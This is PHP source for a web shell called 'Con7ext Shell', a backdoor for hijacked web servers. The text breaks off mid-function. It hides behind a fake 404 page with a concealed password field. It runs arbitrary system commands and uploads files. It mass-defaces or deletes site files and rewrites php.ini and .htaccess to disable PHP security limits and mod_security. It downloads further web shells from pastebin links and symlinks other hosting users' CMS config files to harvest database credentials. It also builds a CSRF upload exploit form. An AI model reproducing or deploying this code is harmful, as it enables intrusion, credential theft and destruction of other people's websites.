if(get_magic_quotes_gpc()) { 	
function VEstripslashes($array) { 		return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 


function Login() {
	die("
<html><head><title>404 Not Found</title></head>
<style> 
input { margin:0;background-color:#fff;border:1px solid #fff; } 
</style> 
<body>
<h1>Not Found</h1>
<p>The requested URL  was not found on this server.</p><hr>
<form method=post>
<input type=password name=pass></form></body></html>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Con7ext Shell </title>
<style>
body{
background-color: #333333;
color:#B3454C;
}
li {
	display: inline;
	margin: 1px;
	padding: 1px;
}

 #menu a {
				padding:2px 10px;  
				margin:0; 
				background:#333333; 
				text-decoration:none; 
				letter-spacing:2px; 
				padding: 2px 10px;
				margin: 0;
				background: #333333;
				text-decoration: none;
				letter-spacing: 2px;
				border-radius: 2px;
				border-bottom: 2px solid #B3454C;
				border-top: 2px solid #B3454C;
				border-right: 2px solid red;
				border-left: 2px solid red;
       }
       #menu a:hover {
			background:#180000; 
			border-bottom:0px solid #333333; 
			border-top:0px solid #333333; 
       }
a{
color:#B3454C;
text-decoration: none;
}
textarea{
backgroud-color:#333333;
color: #B3454C;
}
input,select{
border: 1px #B3454C solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>

<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function sulap($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
	}
  return stripslashes($text);
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
$_c7e = 'WGFpIFN5bmRpY2F0ZQ==';
$sys = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
$getds = @ini_get("disable_functions");
$ds = (!empty($getds)) ? "<font>$ds</font>" : "<font>NONE</font>";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
$home_r = $_SERVER['DOCUMENT_ROOT'];
$_COPY = base64_decode($_c7e);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$path/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=green>Uploaded!</font> at <i><b>$path/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>Failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		}
	}
	echo "<center>Uploader :
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($path,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo '<center>
<table width="700" align="center">
<center>
<form method="get">
<select name="shell">
<option value="">Shell Creator</option>
<option value="wso">WSO Shell</option>
<option value="idx">IDX Shell</option>
<option value="b374k">B374K Shell</option>
<option value="r57">R57 Shell</option>
<option value="b374k">b374k Shell</option>
<option value="blackhat">BlackHat Shell</option>
<option value="noname">Noname Shell</option>
</select>
<input type="submit" value=">">
</form>
</center>
';
echo'
<div id="menu">
<center>
<ul>
<li><a href="?">Home</a></li>
<li><a href="?path='.$path.'&con7ext=info">System Info</a></li>
<li><a href="?path='.$path.'&con7ext=config">Config Grab</a></li>
<li><a href="?path='.$path.'&con7ext=crkcp">Cp Crack</a></li>
<li><a href="?path='.$path.'&con7ext=jumping">Jumping</a></li>
<li><a href="?path='.$path.'&con7ext=symlink">Symlink</a></li>
<li><a href="?path='.$path.'&con7ext=adminer">Adminer</a></li><br><br>
<li><a href="?path='.$path.'&con7ext=network">BackConnect</a>
<li><a href="?path='.$path.'&con7ext=mail">Mailer</a></li>
<li><a href="?path='.$path.'&con7ext=edituser">Auto Edit User</a></li>
<li><a href="?path='.$path.'&con7ext=zoneh">Zone-H</a></li>
<li><a href="?path='.$path.'&con7ext=defid">Defacer.id</a></li>
<li><a href="?path='.$path.'&con7ext=symconfig">SymConfig</a></li><br><br>
<li><a href="?path='.$path.'&con7ext=disablefunc">Disable Functions</a></li>
<li><a href="?path='.$path.'&con7ext=domains">Domain Views</a></li>
<li><a href="?path='.$path.'&con7ext=hashid">Hash ID</a></li>
<li><a href="?path='.$path.'&con7ext=bing">Bing Grab</a></li>
<li><a href="?path='.$path.'&con7ext=mass_deface">Mass Tools</a></li><br><br>
<li><a href="?path='.$path.'&con7ext=cmd">Command</a></li>
<li><a href="?path='.$path.'&con7ext=csrfup">Csrf Exploiter</a></li>
<li><a href="?path='.$path.'&con7ext=vhost">Bypass Vhost</a></li>
<li><a href="?path='.$path.'&con7ext=kill">Kill Your Self</a></li>
</ul></center></div>';
echo '
<br>
<table width="700" align="center">
<tr><td><font color="white">Current Path :</font>';
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr>';
echo '</table>';
if($_GET['con7ext'] == 'logout') {
echo '<form action="?patch='.$path.'&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Good Bye!!';
} elseif($_GET['con7ext'] == 'cmd') {
echo "<br><fieldset>";
	echo "<form method='post'>
<font style='text-decoration: underline;'>Command : </font>
<input type='text' size='30' height='10' name='command'><input type='submit' name='c7ecmd' value='>>'>
	</form>	";
	if(isset($_POST['c7ecmd']))
{
 
echo'<br><div style="background:#6d6d6d;margin:0px;padding:1px;text-align:left;color:lime;"><pre>';
$cmd = $_POST['command'];
if($cmd == "")
{
 
echo "Please Insert Command!";
 }
 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div><br><br>';
}
echo "</fieldset><br>";
}elseif($_GET['con7ext'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='noname.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Rinto AR</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
} elseif($_GET['con7ext'] == 'vhost') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / Rintoar.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Rintoar.txt");
			$rt="<br><a href=Rintoar.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";
} elseif($_GET['con7ext'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by Rinto AR</h1><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="post" style="font-size:25px;">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
</html>";
}
} elseif($_GET['con7ext'] == 'hashid') {
if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "Hash type not found";
        }
    } else {
        $hashresult = "Not Hash Entered";
    }
?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<tr>
		<table >
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
<?php
} elseif($_GET['con7ext'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
} elseif($_GET['con7ext'] == 'disablefunc'){
		echo "<center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}
		echo"</center>";
}elseif($_GET['shell'] == 'wso'){
	$tools_dir = mkdir('c7e_tools', 0755);
	$file_tools = "c7e_tools/wso.php";
	$isi_httools = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools = fopen(".htaccess", "w");
	$tools_script = file_get_contents("http://pastebin.com/raw.php?i=N0eh3Q7Y");
	$tools = fopen($file_tools, "w");
	fwrite($tools, $tools_script);
	fwrite($httools, $isi_httools);
	chmod($file_tools, 0755);
	echo "Done <a href='c7e_tools/wso.php'>WSO Shell Here</a>";
}
elseif($_GET['shell'] == 'idx'){
	$tools2_dir = mkdir('c7e_tools', 0755);
	$file_tools2 = "c7e_tools/idx.php";
	$isi_httools2 = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools2 = fopen(".htaccess", "w");
	$tools2_script = file_get_contents("http://pastebin.com/raw.php?i=nC6pWh5a");
	$tools2 = fopen($file_tools2, "w");
	fwrite($tools2, $tools2_script);
	fwrite($httools2, $isi_httools2);
	chmod($file_tools2, 0755);
	echo "Done <a href='c7e_tools/idx.php'>Idx Shell Here</a>";
}
elseif($_GET['shell'] == 'b374k'){
	$tools3_dir = mkdir('c7e_tools', 0755);
	$file_tools3 = "c7e_tools/b374k.php";
	$isi_httools3 = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools3 = fopen(".htaccess", "w");
	$tools3_script = file_get_contents("http://pastebin.com/raw.php?i=cR71LiMp");
	$tools3 = fopen($file_tools3, "w");
	fwrite($tools3, $tools3_script);
	fwrite($httools3, $isi_httools3);
	chmod($file_tools3, 0755);
	echo "Done <a href='c7e_tools/b374k.php'>b374k Shell Here</a>";
}
elseif($_GET['shell'] == 'sadrazam'){
	$tools4_dir = mkdir('c7e_tools', 0755);
	$file_tools4 = "c7e_tools/sadrazam.php";
	$isi_httools4 = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools4 = fopen(".htaccess", "w");
	$tools4_script = file_get_contents("http://pastebin.com/raw.php?i=xjKrnnBD");
	$tools4 = fopen($file_tools4, "w");
	fwrite($tools4, $tools4_script);
	fwrite($httools4, $isi_httools4);
	chmod($file_tools4, 0755);
	echo "Done <a href='c7e_tools/sadrazam.php'>Sadrazam Shell Here</a>";
}
elseif($_GET['shell'] == 'blackhat'){
	$tools5_dir = mkdir('c7e_tools', 0755);
	$file_tools5 = "c7e_tools/bh.php";
	$isi_httools5 = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools5 = fopen(".htaccess", "w");
	$tools5_script = file_get_contents("http://pastebin.com/raw.php?i=3L2ESWeu");
	$tools5 = fopen($file_tools5, "w");
	fwrite($tools5, $tools5_script);
	fwrite($httools5, $isi_httools5);
	chmod($file_tools5, 0755);
	echo "Done <a href='c7e_tools/bh.php'>Black Hat Shell Here</a>";
}
elseif($_GET['shell'] == 'r57'){
	$tools6_dir = mkdir('c7e_tools', 0755);
	$file_tools6 = "c7e_tools/r57.php";
	$isi_httools6 = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools6 = fopen(".htaccess", "w");
	$tools6_script = file_get_contents("http://pastebin.com/raw.php?i=G2VEDunW");
	$tools6 = fopen($file_tools6, "w");
	fwrite($tools6, $tools6_script);
	fwrite($httools6, $isi_httools6);
	chmod($file_tools6, 0755);
	echo "Done <a href='c7e_tools/r57.php'>R57 Shell Here</a>";
}
elseif($_GET['shell'] == 'noname'){
	$tools7_dir = mkdir('c7e_tools', 0755);
	$file_tools7 = "c7e_tools/noname.php";
	$isi_httools7 = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";
	$httools7 = fopen(".htaccess", "w");
	$tools7_script = file_get_contents("http://pastebin.com/raw.php?i=BRCmf02c");
	$tools7 = fopen($file_tools7, "w");
	fwrite($tools7, $tools7_script);
	fwrite($httools7, $isi_httools7);
	chmod($file_tools7, 0755);
	echo "Done <a href='c7e_tools/noname.php'>Noname Shell Here</a>";
}
elseif($_GET['con7ext'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("c7e_symconf", 0777);
@chdir("c7e_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex c7eisjustice.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','c7e_symconf/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
